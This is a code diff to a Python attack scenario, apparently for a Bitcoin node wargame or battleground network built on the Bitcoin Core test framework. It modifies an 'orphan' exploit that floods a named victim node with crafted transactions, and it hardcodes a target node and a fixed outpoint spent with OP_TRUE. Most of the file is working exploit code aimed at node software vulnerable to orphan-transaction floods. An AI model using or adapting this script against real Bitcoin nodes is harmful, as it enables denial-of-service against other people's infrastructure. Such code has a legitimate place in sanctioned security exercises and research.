@@ -9,13 +9,17 @@ from commander import Commander
 from test_framework.messages import (
     hash256,
     msg_tx,
+    COIN,
     CTransaction,
     CTxOut,
     CTxIn,
     COutPoint,
+    SEQUENCE_FINAL,
 )
 from test_framework.script import CScript
 from test_framework.p2p import MAGIC_BYTES, P2PInterface
+from test_framework.script import CScript, OP_TRUE
+from test_framework.address import script_to_p2sh, address_to_scriptpubkey
 
 
 def get_signet_network_magic_from_node(node):
@@ -45,11 +49,22 @@ class Orphan50(Commander):
     # Scenario entrypoint
     def run_test(self):
         self.log.info("Starting orphan scenario")
+        node = self.nodes[0]
+        # create wallet miner, might already exist
+        try:
+            node.createwallet("miner", False, None, None, False, True, False)
+        except:
+            pass
+        try:
+            node.loadwallet("miner")
+        except:
+            pass
 
         # We pick a node on the network to attack
         # We know this one is vulnderable to 50 orphans based on it's subver
         # Change this to your teams colour if running in the battleground
-        victim = "TARGET_TANK_NAME.default.svc"
+        # victim = "TARGET_TANK_NAME.default.svc"
+        victim = "tank-0002-red.default.svc"
 
         # regtest or signet
         chain = self.nodes[0].chain
@@ -75,10 +90,29 @@ class Orphan50(Commander):
         for i in range(100):
             # make a transaction that spends an output that doesn't exist
             tx = CTransaction()
-            tx.vout.append(
-                CTxOut(100000000, CScript(bytes.fromhex("0014" + ("00" * 20))))
+
+            # tx.vin.append(
+            #     CTxIn(COutPoint(first_tx.sha256, 0), scriptSig=CScript([script]))
+            # )
+            tx.vin.append(
+                CTxIn(
+                    COutPoint(
+                        int(
+                            "e3bb40caa4d604219a7394fdc8c72f1002b31b17ddcb01ddda3ccc8a20a0c183",
+                            16,
+                        ),
+                        0,
+                    ),
+                    CScript([OP_TRUE]),
+                    SEQUENCE_FINAL,
+                )
             )
-            tx.vin.append(CTxIn(COutPoint(random.randint(1, int(1e64)), 0)))
+            tx.vout.append(
+                CTxOut(
+                    int(0.00009 * COIN), address_to_scriptpubkey(node.getnewaddress())
+                )
+            )
+
             tx.calc_sha256()
 
             print(tx.serialize().hex())
